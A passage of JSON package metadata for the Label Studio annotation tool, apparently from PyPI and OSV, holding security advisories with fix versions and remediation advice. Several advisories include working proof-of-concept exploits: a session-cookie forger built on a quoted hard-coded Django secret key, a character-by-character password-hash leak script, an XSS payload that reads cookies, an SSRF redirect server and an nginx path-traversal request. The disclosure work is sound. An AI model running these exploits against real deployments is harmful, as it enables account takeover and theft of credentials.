claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.4.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.4.post1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.3)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.4.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"627305ebcbd1b5ff459c510461e85991de48d061476f50eea665ca4d7c8b35df","md5":"d8015a1c0b1b349a897b891f608a3b39","sha256":"2705b58eb786e44a64033904c7977893a3ee2d5e20e43e811d2069f4b63ff940"},"downloads":-1,"filename":"label_studio-0.4.4.post1-py3-none-any.whl","has_sig":false,"md5_digest":"d8015a1c0b1b349a897b891f608a3b39","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7170782,"upload_time":"2020-01-22T12:34:56","upload_time_iso_8601":"2020-01-22T12:34:56.581718Z","url":"https://files.pythonhosted.org/packages/62/73/05ebcbd1b5ff459c510461e85991de48d061476f50eea665ca4d7c8b35df/label_studio-0.4.4.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a1359e99b02e6fb4b531304ca76bf8e144fd7a69e2c98bf5706920c9af2d0c9b","md5":"dea07c97c3475c2b85bdcca466d032a2","sha256":"ed712fb25fd527eb5a940cc62540a2bfe3da593367016f5189926ef1da9d8def"},"downloads":-1,"filename":"label-studio-0.4.4.post1.tar.gz","has_sig":false,"md5_digest":"dea07c97c3475c2b85bdcca466d032a2","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7107074,"upload_time":"2020-01-22T12:35:02","upload_time_iso_8601":"2020-01-22T12:35:02.668964Z","url":"https://files.pythonhosted.org/packages/a1/35/9e99b02e6fb4b531304ca76bf8e144fd7a69e2c98bf5706920c9af2d0c9b/label-studio-0.4.4.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    